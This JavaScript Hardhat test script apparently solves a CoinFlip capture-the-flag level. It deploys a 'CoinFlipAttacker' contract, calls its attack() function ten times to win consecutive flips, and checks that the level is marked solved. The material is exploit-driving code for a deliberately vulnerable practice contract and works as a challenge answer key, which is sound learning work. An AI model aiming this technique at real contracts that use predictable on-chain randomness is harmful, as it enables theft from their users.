const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF")
    challenge = await ethers.getContractAt("CoinFlip", challengeAddress)

    const attackerFactory = await ethers.getContractFactory("CoinFlipAttacker")
    attacker = await attackerFactory.deploy(challenge.address)
})

it("solves the challenge", async function () {
    for (let i = 0; i < 10; i++) {
        tx = await attacker.attack()
        await tx.wait()

        // simulate waiting 1 block - we re running on HH, so this is not required => each txn aautomatically advances 1 block
        //await ethers.provider.send("evm_increaseTime", [1]) // add 1 second
        //await ethers.provider.send("evm_mine", [])
        //console.log(await ethers.provider.getBlockNumber())
    }
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
